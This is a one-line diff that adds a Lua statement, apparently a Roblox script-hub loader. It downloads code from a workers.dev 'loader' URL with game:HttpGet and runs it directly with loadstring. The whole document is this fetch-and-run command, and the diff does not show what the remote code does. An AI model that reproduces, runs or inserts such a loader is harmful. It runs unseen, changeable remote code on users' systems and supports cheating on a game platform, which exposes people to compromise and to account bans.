@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://loader.xzuyaxhub.workers.dev/?repo=Universal"))()
